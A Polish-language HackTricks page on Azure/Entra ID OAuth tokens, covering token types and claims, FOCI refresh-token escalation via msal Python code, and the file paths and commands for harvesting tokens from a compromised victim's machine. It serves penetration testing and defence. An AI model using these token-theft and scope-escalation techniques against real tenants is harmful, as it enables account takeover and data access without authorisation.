# Az - Tokeny i publiczne aplikacje

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Entra ID to chmurowa platforma zarządzania tożsamością i dostępem (IAM) Microsoftu, służąca jako podstawowy system uwierzytelniania i autoryzacji dla usług takich jak Microsoft 365 i Azure Resource Manager. Azure AD implementuje framework autoryzacji OAuth 2.0 oraz protokół uwierzytelniania OpenID Connect (OIDC) do zarządzania dostępem do zasobów.

### OAuth

**Kluczowi uczestnicy w OAuth 2.0:**

1. **Resource Server (RS):** Chroni zasoby należące do właściciela zasobów.
2. **Resource Owner (RO):** Zazwyczaj końcowy użytkownik będący właścicielem chronionych zasobów.
3. **Client Application (CA):** Aplikacja żądająca dostępu do zasobów w imieniu właściciela zasobów.
4. **Authorization Server (AS):** Wydaje tokeny dostępu aplikacjom klienckim po ich uwierzytelnieniu i autoryzacji.

**Scopes i zgoda:**

- **Scopes:** Szczegółowe uprawnienia zdefiniowane na serwerze zasobów, określające poziomy dostępu.
- **Consent:** Proces, w którym właściciel zasobów przyznaje aplikacji klienckiej uprawnienia do dostępu do zasobów z określonymi scopes.

**Integracja z Microsoft 365:**

- Microsoft 365 używa Azure AD do IAM i składa się z wielu "first-party" OAuth aplikacji.
- Aplikacje te są głęboko zintegrowane i często mają współzależne relacje serwisowe.
- Aby uprościć doświadczenie użytkownika i utrzymać funkcjonalność, Microsoft przyznaje tym first-party aplikacjom "implied consent" lub "pre-consent".
- **Implied Consent:** Niektóre aplikacje są automatycznie **przyznawane dostęp do określonych scopes bez jawnej zgody użytkownika lub administratora**.
- Te pre-consented scopes są zazwyczaj ukryte przed użytkownikami i administratorami, co sprawia, że są mniej widoczne w standardowych interfejsach zarządzania.

**Rodzaje aplikacji klienckich:**

1. **Confidential Clients:**
- Posiadają własne poświadczenia (np. hasła lub certyfikaty).
- Mogą **bezpiecznie uwierzytelniać się** u authorization servera.
2. **Public Clients:**
- Nie mają unikalnych poświadczeń.
- Nie mogą bezpiecznie uwierzytelniać się u authorization servera.
- **Implikacja bezpieczeństwa:** Atakujący może podszyć się pod public client aplikację podczas żądania tokenów, ponieważ authorization server nie ma mechanizmu weryfikacji prawdziwości aplikacji.

## Tokeny uwierzytelniające

W OIDC używane są **trzy typy tokenów**:

- [**Access Tokens**](https://learn.microsoft.com/en-us/azure/active-directory/develop/access-tokens)**:** Klient przekazuje ten token serwerowi zasobów, aby **uzyskać dostęp do zasobów**. Może być użyty tylko dla konkretnej kombinacji użytkownika, klienta i zasobu i **nie może zostać unieważniony** aż do wygaśnięcia — domyślnie 1 godzina.
- **ID Tokens**: Klient otrzymuje ten **token od serwera autoryzacji**. Zawiera podstawowe informacje o użytkowniku. Jest **powiązany z konkretną kombinacją użytkownika i klienta**.
- **Refresh Tokens**: Dostarczane klientowi wraz z tokenem dostępu. Służą do **uzyskiwania nowych access i ID tokenów**. Są powiązane z konkretną kombinacją użytkownika i klienta i mogą być unieważnione. Domyślny okres wygaśnięcia to **90 dni** dla nieaktywnych refresh tokenów i **brak wygaśnięcia dla aktywnych tokenów** (z refresh tokena można otrzymać nowe refresh tokeny).
- Refresh token powinien być powiązany z polem **`aud`**, z pewnymi **scopes** oraz z **tenantem** i powinien generować access tokeny tylko dla tego aud, tych scopes (i nie więcej) oraz tego tenant. Jednak nie dotyczy to tokenów aplikacji **FOCI**.
- Refresh token jest zaszyfrowany i tylko Microsoft może go odszyfrować.
- Uzyskanie nowego refresh tokena nie unieważnia poprzedniego refresh tokena.

> [!WARNING]
> Informacje dotyczące **conditional access** są **przechowywane** wewnątrz **JWT**. Zatem, jeśli zażadasz **tokenu z dozwolonego adresu IP**, ten **adres IP** zostanie **zapisany** w tokenie i potem możesz użyć tego tokenu z **adresu IP, który nie jest dozwolony, aby uzyskać dostęp do zasobów**.

### Access Tokens "aud"

Pole wskazane w polu "aud" to **serwer zasobów** (aplikacja) używana do przeprowadzenia logowania.

Polecenie `az account get-access-token --resource-type [...]` obsługuje następujące typy, a każdy z nich doda specyficzne "aud" do otrzymanego access tokena:

> [!CAUTION]
> Zauważ, że poniższe to tylko API obsługiwane przez `az account get-access-token`, ale istnieją też inne.

<details>

<summary>aud examples</summary>

- **aad-graph (Azure Active Directory Graph API)**: Używane do uzyskania dostępu do przestarzałego Azure Active Directory Graph API (deprecated), które pozwala aplikacjom na odczyt i zapis danych katalogu w Azure Active Directory (Azure AD).
- `https://graph.windows.net/`

* **arm (Azure Resource Manager)**: Używane do zarządzania zasobami Azure przez Azure Resource Manager API. Obejmuje operacje takie jak tworzenie, aktualizacja i usuwanie zasobów takich jak maszyny wirtualne, konta storage i inne.
- `https://management.core.windows.net/ or https://management.azure.com/`

- **batch (Azure Batch Services)**: Używane do dostępu do Azure Batch, usługi umożliwiającej wydajne uruchamianie aplikacji równoległych i HPC w chmurze.
- `https://batch.core.windows.net/`

* **data-lake (Azure Data Lake Storage)**: Używane do interakcji z Azure Data Lake Storage Gen1, skalowalną usługą przechowywania danych i analityki.
- `https://datalake.azure.net/`

- **media (Azure Media Services)**: Używane do dostępu do Azure Media Services, które oferują przetwarzanie i dostarczanie mediów (wideo i audio) w chmurze.
- `https://rest.media.azure.net`

* **ms-graph (Microsoft Graph API)**: Używane do dostępu do Microsoft Graph API, zunifikowanego punktu końcowego dla danych usług Microsoft 365. Pozwala uzyskać dostęp do danych i informacji z usług takich jak Azure AD, Office 365, Enterprise Mobility i Security services.
- `https://graph.microsoft.com`

- **oss-rdbms (Azure Open Source Relational Databases)**: Używane do dostępu do usług baz danych Azure dla open-source'owych silników relacyjnych, takich jak MySQL, PostgreSQL i MariaDB.
- `https://ossrdbms-aad.database.windows.net`

</details>

### Access Tokens Scopes "scp"

Zakres access tokena jest przechowywany w kluczu scp wewnątrz access token JWT. Te scopes definiują, do czego access token ma dostęp.

Jeśli JWT ma uprawnienie do kontaktu z konkretnym API, ale **nie ma scope** pozwalającego wykonać żądaną akcję, **nie będzie w stanie wykonać tej akcji** przy użyciu tego JWT.

### Przykład pobierania refresh i access tokenów
```python
# Code example from https://github.com/secureworks/family-of-client-ids-research
import msal
import requests
import jwt
from pprint import pprint
from typing import Any, Dict, List


# LOGIN VIA CODE FLOW AUTHENTICATION
azure_cli_client = msal.PublicClientApplication(
"00b41c95-dab0-4487-9791-b9d2c32c80f2" # ID for Office 365 Management
)
device_flow = azure_cli_client.initiate_device_flow(
scopes=["https://graph.microsoft.com/.default"]
)
print(device_flow["message"])

# Perform device code flow authentication

azure_cli_bearer_tokens_for_graph_api = azure_cli_client.acquire_token_by_device_flow(
device_flow
)
pprint(azure_cli_bearer_tokens_for_graph_api)


# DECODE JWT
def decode_jwt(base64_blob: str) -> Dict[str, Any]:
"""Decodes base64 encoded JWT blob"""
return jwt.decode(
base64_blob, options={"verify_signature": False, "verify_aud": False}
)
decoded_access_token = decode_jwt(
azure_cli_bearer_tokens_for_graph_api.get("access_token")
)
pprint(decoded_access_token)


# GET NEW ACCESS TOKEN AND REFRESH TOKEN
new_azure_cli_bearer_tokens_for_graph_api = (
# Same client as original authorization
azure_cli_client.acquire_token_by_refresh_token(
azure_cli_bearer_tokens_for_graph_api.get("refresh_token"),
# Same scopes as original authorization
scopes=["https://graph.microsoft.com/.default"],
)
)
pprint(new_azure_cli_bearer_tokens_for_graph_api)
```
### Inne pola tokena dostępu

- **appid**: Identyfikator aplikacji użyty do wygenerowania tokena
- **appidacr**: Application Authentication Context Class Reference wskazuje, w jaki sposób klient został uwierzytelniony — dla publicznego klienta wartość to 0, a jeśli użyto sekretu klienta (client secret) wartość to 1
- **acr**: Authentication Context Class Reference ma wartość "0", gdy uwierzytelnienie użytkownika końcowego nie spełnia wymagań ISO/IEC 29115.
- **amr**: Metoda uwierzytelniania wskazuje, w jaki sposób token został uwierzytelniony. Wartość „pwd” oznacza, że użyto hasła.
- **groups**: Wskazuje grupy, których członkiem jest podmiot.
- **iss**: Issuer identyfikuje security token service (STS), który wygenerował token, np. https://sts.windows.net/fdd066e1-ee37-49bc-b08f-d0e152119b04/ (uuid to tenant ID)
- **oid**: ID obiektu podmiotu
- **tid**: ID dzierżawy (tenant ID)
- **iat, nbf, exp**: Issued at (kiedy został wydany), Not before (nie można używać przed tym czasem, zwykle ta sama wartość co iat), Expiration time (czas wygaśnięcia).


## Eskalacja uprawnień tokenów FOCI

Wcześniej wspomniano, że refresh tokens powinny być powiązane z **scopes**, z **application** i z **tenant**, dla których zostały wygenerowane. Jeśli któreś z tych ograniczeń zostanie złamane, możliwa jest eskalacja uprawnień — będzie można wygenerować access tokens do innych zasobów i tenantów, do których użytkownik ma dostęp, oraz z większymi scopes niż pierwotnie przewidziano.

Co więcej, **jest to możliwe dla wszystkich refresh tokens** w [Microsoft identity platform](https://learn.microsoft.com/en-us/entra/identity-platform/) (Microsoft Entra accounts, Microsoft personal accounts, and social accounts like Facebook and Google), ponieważ, jak wspominają [**docs**](https://learn.microsoft.com/en-us/entra/identity-platform/refresh-tokens): "Refresh tokens are bound to a combination of user and client, but **aren't tied to a resource or tenant**. A client can use a refresh token to acquire access tokens **across any combination of resource and tenant** where it has permission to do so. Refresh tokens are encrypted and only the Microsoft identity platform can read them."

Dodatkowo, aplikacje FOCI są aplikacjami publicznymi, więc **żaden sekret nie jest potrzebny** do uwierzytelnienia się na serwerze.

Znane klienty FOCI zgłoszone w [**original research**](https://github.com/secureworks/family-of-client-ids-research/tree/main) można [**found here**](https://github.com/secureworks/family-of-client-ids-research/blob/main/known-foci-clients.csv).

### Uzyskaj inny zakres

Kontynuując wcześniejszy przykład kodu, w tym fragmencie żądany jest nowy token dla innego zakresu:
```python
# Code from https://github.com/secureworks/family-of-client-ids-research
azure_cli_bearer_tokens_for_outlook_api = (
# Same client as original authorization
azure_cli_client.acquire_token_by_refresh_token(
new_azure_cli_bearer_tokens_for_graph_api.get(
"refresh_token"
),
# But different scopes than original authorization
scopes=[
"https://outlook.office.com/.default"
],
)
)
pprint(azure_cli_bearer_tokens_for_outlook_api)
```
### Uzyskaj innego klienta i inne zakresy
```python
# Code from https://github.com/secureworks/family-of-client-ids-research
microsoft_office_client = msal.PublicClientApplication("d3590ed6-52b3-4102-aeff-aad2292ab01c")
microsoft_office_bearer_tokens_for_graph_api = (
# This is a different client application than we used in the previous examples
microsoft_office_client.acquire_token_by_refresh_token(
# But we can use the refresh token issued to our original client application
azure_cli_bearer_tokens_for_outlook_api.get("refresh_token"),
# And request different scopes too
scopes=["https://graph.microsoft.com/.default"],
)
)
# How is this possible?
pprint(microsoft_office_bearer_tokens_for_graph_api)
```
## Gdzie znaleźć tokens

Z perspektywy atakującego bardzo istotne jest wiedzieć, gdzie można znaleźć access i refresh tokens, np. gdy komputer ofiary zostanie skompromitowany:

- Inside **`<HOME>/.Azure`**
- **`azureProfile.json`** zawiera informacje o wcześniej zalogowanych użytkownikach
- **`clouds.config contains`** informacje o subskrypcjach
- **`service_principal_entries.json`** zawiera poświadczenia aplikacji (tenant id, clients and secret). Tylko w Linux & macOS
- **`msal_token_cache.json`** zawiera access tokens i refresh tokens. Tylko w Linux & macOS
- **`service_principal_entries.bin`** and msal_token_cache.bin są używane w Windows i są zaszyfrowane za pomocą DPAPI
- **`msal_http_cache.bin`** to pamięć podręczna żądań HTTP
- Load it: `with open("msal_http_cache.bin", 'rb') as f: pickle.load(f)`
- **`AzureRmContext.json`** zawiera informacje o wcześniejszych logowaniach przy użyciu Az PowerShell (ale bez poświadczeń)
- Inside **`C:\Users\<username>\AppData\Local\Microsoft\IdentityCache\*`** znajduje się kilka `.bin` plików z **access tokens**, ID tokens i informacjami o koncie zaszyfrowanymi za pomocą DPAPI użytkownika.
- Można znaleźć więcej **access tokens** w plikach `.tbres` wewnątrz **`C:\Users\<username>\AppData\Local\Microsoft\TokenBroken\Cache\`**, które zawierają base64 zaszyfrowane za pomocą DPAPI z access tokens.
- W Linux i macOS można uzyskać **access tokens, refresh tokens and id tokens** z Az PowerShell (jeśli używane), uruchamiając `pwsh -Command "Save-AzContext -Path /tmp/az-context.json"`
- W Windows to generuje tylko id tokens.
- Można sprawdzić, czy Az PowerShell był używany w Linux i macSO, sprawdzając, czy istnieje `$HOME/.local/share/.IdentityService/` (choć zawarte pliki są puste i bezużyteczne)
- Jeśli użytkownik jest **logged inside Azure with the browser**, zgodnie z tym [**post**](https://www.infosecnoodle.com/p/obtaining-microsoft-entra-refresh?r=357m16&utm_campaign=post&utm_medium=web) można uruchomić flow uwierzytelniania z **przekierowaniem na localhost**, sprawić, by przeglądarka automatycznie zatwierdziła logowanie i otrzymać refresh token. Zauważ, że tylko kilka aplikacji FOCI pozwala na redirect do localhost (np. az cli lub moduł powershell), więc te aplikacje muszą być dozwolone.
- Inną opcją opisaną na blogu jest użycie narzędzia [**BOF-entra-authcode-flow**](https://github.com/sudonoodle/BOF-entra-authcode-flow), które może użyć dowolnej aplikacji, ponieważ **pobierze OAuth code, a następnie uzyska refresh token z tytułu końcowej strony auth** używając redirect URI `https://login.microsoftonline.com/common/oauth2/nativeclient`.

## References

- [https://github.com/secureworks/family-of-client-ids-research](https://github.com/secureworks/family-of-client-ids-research)
- [https://github.com/Huachao/azure-content/blob/master/articles/active-directory/active-directory-token-and-claims.md](https://github.com/Huachao/azure-content/blob/master/articles/active-directory/active-directory-token-and-claims.md)

{{#include ../../../banners/hacktricks-training.md}}
